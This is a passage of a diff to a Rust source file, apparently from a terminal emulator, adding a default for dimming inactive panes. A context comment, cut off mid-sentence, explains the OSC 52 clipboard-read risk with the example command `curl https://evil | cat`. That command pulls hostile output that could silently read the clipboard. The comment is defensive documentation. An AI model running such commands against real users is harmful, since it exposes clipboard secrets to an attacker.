@@ -40,6 +40,9 @@ pub enum ReduceMotion {
     Off,
 }
 
+/// `[window] dim_inactive_panes` when unset (C62).
+pub const DIM_INACTIVE_DEFAULT: bool = true;
+
 /// OSC 52 clipboard policy (`clipboard` config key). A child program can ask
 /// the terminal to read the system clipboard back to it (`52;c;?`) — with no
 /// gate, `curl https://evil | cat` printing that escape sequence silently
